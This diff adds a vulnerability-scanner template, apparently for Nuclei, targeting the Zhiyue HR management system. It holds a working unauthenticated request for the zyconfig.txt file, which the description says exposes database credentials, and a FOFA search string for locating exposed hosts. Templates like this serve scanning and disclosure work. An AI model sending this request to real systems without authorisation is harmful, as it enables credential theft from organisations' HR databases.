@@ -1,0 +1,24 @@
+id: zhiyue-hrm-zyconfig-info-leak
+
+info:
+  name: 智跃人力资源管理系统 zyconfig.txt 配置文件敏感数据暴露
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="ZY.LOGO.64.png"
+          智跃人力资源管理系统由东莞市智跃软件科技有限公司开发，提供人事、考勤、薪资等模块的数字化管理解决方案。该系统zyconfig.txt配置文件存在未授权访问漏洞，攻击者可通过直接请求获取包含数据库连接凭据及系统配置参数的敏感数据。该缺陷源于文件访问控制机制缺失，导致配置文件内容暴露于外部网络。
+  tags: 智跃人力资源管理系统
+
+http:
+- raw:
+  - |
+    GET /resource/servs/file/zyconfig.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Source'
